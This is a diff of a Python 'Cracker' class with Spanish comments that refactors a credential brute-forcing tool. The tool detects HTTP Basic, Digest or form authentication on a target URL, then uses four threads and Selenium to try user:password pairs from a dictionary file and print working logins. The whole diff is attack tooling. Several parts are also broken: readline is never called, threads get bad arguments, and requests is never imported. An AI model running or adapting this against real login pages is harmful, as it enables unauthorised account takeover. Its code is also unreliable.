@@ -1,4 +1,6 @@
 import socket
+import threading
+
 from requests.auth import HTTPBasicAuth, HTTPDigestAuth
 from htmlstructure import HTML
 from HTTPrequest import HTTPrequest
@@ -6,78 +8,107 @@ from selenium import webdriver
 
 
 class Cracker(HTTPrequest):
-    def __init__(self, url, dictionary_user, dictionary_pass):
+    def __init__(self, url, dict):
         super().__init__()
-        self.numrequests = 0
-        self.urlattack = url
-        self.authentication=""
-        self.dictusername = dictionary_user
-        self.dictpassword = dictionary_pass
+        self.url_attack = url
+        self.authentication = ""
+        self.dictionary = dict
+        self.lock_acceso_fichero = threading.Lock()
 
     def detect_auth(self):
-        request = {'method': 'get', 'url': self.urlattack}
+        request = {'method': 'get', 'url': self.url_attack}
         response, result = self.request(request)
         if response.status_code == 200:
             self.authentication = 'form'
         if response.status_code == 401:
-            if response.headers['WWW-Authenticate'].find('Basic')!=-1:
+            if response.headers['WWW-Authenticate'].find('Basic') != -1:
                 self.authentication = 'basic'
-            elif response.headers['WWW-Authenticate'].find('Digest')!=-1:
-                self.authentication='digest'
+            elif response.headers['WWW-Authenticate'].find('Digest') != -1:
+                self.authentication = 'digest'
 
-
-    def basicauthcrack(self):
-        dictus = open(self.dictusername)
-        dictpass = open(self.dictusername)
-        exit = False
-        for lineaus in dictus:
-            if exit:
+    def workerbasic(self, dict):
+        self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
+        line = dict.readline
+        self.lock_acceso_fichero.release()
+        while line != "":
+            [username, password] = line.split(':')
+            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPBasicAuth(username, password)}
+            response, result = self.request(request)
+            if result['status'] < 0:
+                print('Error en la conexión')
                 break
-            username = lineaus
-            for lineapass in dictpass:
-                password = lineapass
-                request = {'method': 'get', 'url': self.urlattack, 'auth': HTTPBasicAuth(username, password)}
-                response, result = self.request(request)
-                if result['status'] < 0:
-                    print('Error en la conexión')
-                    break
-                if response.status_code == 200:
-                    exit = True
-                    print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
-                    break
-        if not exit:
-            print('Ningún usuario y contraseña válidos')
-        dictus.close()
-        dictpass.close()
-
-    def digestauthcrack(self):
-        dictus = open(self.dictusername)
-        dictpass = open(self.dictusername)
-        exit = False
-        for lineaus in dictus:
-            if exit:
+            if response.status_code == 200:
+                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
                 break
-            username = lineaus
-            for lineapass in dictpass:
-                password = lineapass
-                request = {'method': 'get', 'url': self.urlattack, 'auth': HTTPDigestAuth(username, password)}
-                response, result = self.request(request)
-                if result['status'] < 0:
-                    print('Error en la conexión')
-                    break
-                if response.status_code == 200:
-                    exit = True
-                    print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
-                    break
-        if not exit:
-            print('Ningún usuario y contraseña válidos')
-        dictus.close()
-        dictpass.close()
+            self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
+            line = dict.readline
+            self.lock_acceso_fichero.release()
+
+    def workerdigest(self, dict):
+        self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
+        line = dict.readline
+        self.lock_acceso_fichero.release()
+        while line != "":
+            [username, password] = line.split(':')
+            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPDigestAuth(username, password)}
+            response, result = self.request(request)
+            if result['status'] < 0:
+                print('Error en la conexión')
+                break
+            if response.status_code == 200:
+                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
+                break
+            self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
+            line = dict.readline
+            self.lock_acceso_fichero.release()
+
+    def workerform(self, dict):
+        driver = webdriver.Safari()
+        driver.get(self.url_attack)
+        user_box = driver.find_element("id", "username")
+        pass_box = driver.find_element("id", "password")
+        login = driver.find_element("class_name", "ui-button fn-width80")
+
+        self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
+        line = dict.readline
+        self.lock_acceso_fichero.release()
+        while line != "":
+            [username, password] = line.split(':')
+            user_box.send_keys(username)
+            pass_box.send_keys(password)
+            login.click()
+            self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
+            line = dict.readline
+            self.lock_acceso_fichero.release()
+        driver.close()
+
+    def attack(self):
+        diction = open(self.dictionary)
+        thread_count = 4
+        threads = []
+        for i in range(thread_count):
+            if self.authentication == 'basic':
+                t = threading.Thread(target=self.workerbasic, args=diction)
+                threads.append(t)
+                t.start()
+            elif self.authentication == 'digest':
+                t = threading.Thread(target=self.workerdigest, args=diction)
+                threads.append(t)
+                t.start()
+            elif self.authentication == 'form':
+                t = threading.Thread(target=self.workerform, args=diction)
+                threads.append(t)
+                t.start()
+
+        # Esperamos a que terminen todos los hilos antes de terminar el programa principal
+        for thread in threads:
+            thread.join()
+        diction.close()
 
     def formcrack(self, username, password):
         result = {'status': 0}
         try:
-            response = requests.get(self.urlattack)
+            response = requests.get(self.url_attack)
         except requests.exceptions.ConnectionError:
             result = {'status': -1}
         except socket.timeout:
@@ -102,22 +133,10 @@ class Cracker(HTTPrequest):
         datasend['data'][login_form['usr_field']] = username
         datasend['data'][login_form['pwd_field']] = password
 
-        responsepost = requests.post(self.urlattack, data=datasend['data'])
+        responsepost = requests.post(self.url_attack, data=datasend['data'])
         htmlpost = HTML(responsepost.text, "html.parser")
 
         if (responsepost.status_code == 200) and (login_form not in htmlpost):
             print('Usuario y contraseña válidos')
         else:
             print('Usuario y contraseña incorrectos')
-
-    def seleniumformcrack(self, username, password):
-        driver = webdriver.Safari()
-        driver.get(self.urlattack)
-
-        user_box = driver.find_element("id", "username")
-        pass_box = driver.find_element("id", "password")
-        login = driver.find_element("class_name", "ui-button fn-width80")
-        user_box.send_keys(username)
-        pass_box.send_keys(password)
-        login.click()
-        driver.close()
